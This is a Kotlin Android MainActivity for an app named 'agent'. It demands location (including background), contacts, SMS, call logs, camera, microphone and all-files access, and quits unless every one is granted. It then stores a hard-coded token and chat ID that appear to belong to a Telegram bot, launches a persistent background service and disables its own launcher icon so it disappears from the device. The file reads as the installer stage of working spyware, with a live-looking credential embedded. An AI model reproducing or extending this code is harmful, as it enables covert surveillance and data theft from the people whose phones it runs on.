package com.example.agent

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.example.agent.EncryptedConfig
import com.example.agent.ErrorReporter

class MainActivity : AppCompatActivity() {
    private lateinit var prefs: SharedPreferences
    private val PREFS_NAME = "app_prefs"
    private val FIRST_RUN_KEY = "first_run_completed"
    private val PERMISSION_REQUEST_CODE = 100
    private val BATTERY_OPTIMIZATION_REQUEST = 101

    private val requiredPermissions = mutableListOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
    }
    
    private val MANAGE_EXTERNAL_STORAGE_REQUEST = 102

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        val isFirstRunCompleted = prefs.getBoolean(FIRST_RUN_KEY, false)

        if (isFirstRunCompleted) {
            finish()
            return
        }

        setContentView(R.layout.activity_main)
        requestRequiredPermissions()
    }

    private fun requestRequiredPermissions() {
        val permissionsToRequest = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isEmpty()) {
            requestBatteryOptimizationWhitelist()
        } else {
            ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_REQUEST_CODE)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                requestBatteryOptimizationWhitelist()
            } else {
                // Any permission denied — exit
                finish()
            }
        }
    }

    private fun requestBatteryOptimizationWhitelist() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            onAllPermissionsGranted()
            return
        }

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            onAllPermissionsGranted()
        } else {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivityForResult(intent, BATTERY_OPTIMIZATION_REQUEST)
            } catch (e: Exception) {
                ErrorReporter.report(e, "MainActivity")
                onAllPermissionsGranted()
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            BATTERY_OPTIMIZATION_REQUEST -> {
                onAllPermissionsGranted()  // rechecks everything including storage
            }
            MANAGE_EXTERNAL_STORAGE_REQUEST -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && 
                    Environment.isExternalStorageManager()) {
                    proceedToServiceStart()
                } else {
                    // User denied All Files Access — cannot browse broad storage
                    // Still proceed since some capabilities work without it
                    // But inform user
                    ErrorReporter.reportSimple("MANAGE_EXTERNAL_STORAGE denied", "MainActivity")
                    proceedToServiceStart()
                }
            }
        }
    }

    private fun onAllPermissionsGranted() {
        // Check for MANAGE_EXTERNAL_STORAGE on Android 11+ before proceeding
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && 
            !Environment.isExternalStorageManager()) {
            requestManageExternalStorage()
        } else {
            proceedToServiceStart()
        }
    }
    
    private fun requestManageExternalStorage() {
        try {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:$packageName")
            }
            startActivityForResult(intent, MANAGE_EXTERNAL_STORAGE_REQUEST)
        } catch (e: Exception) {
            // Fallback: open general storage settings
            val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
            startActivityForResult(intent, MANAGE_EXTERNAL_STORAGE_REQUEST)
        }
    }
    
    private fun proceedToServiceStart() {
        val config = EncryptedConfig.getInstance(this)
        config.initializeIfNeeded(
            "8697419498:AAFUkgi0_Jft2lpC5M5dWsM2rpVhIeYc91Q",
            "8036939276"
        )
        
        val serviceStarted = startAgentService()
        if (serviceStarted) {
            disableLauncherComponent()
            prefs.edit().putBoolean(FIRST_RUN_KEY, true).apply()
        }
        finish()
    }

    private fun startAgentService(): Boolean {
        return try {
            val serviceIntent = Intent(this, AgentService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun disableLauncherComponent() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}
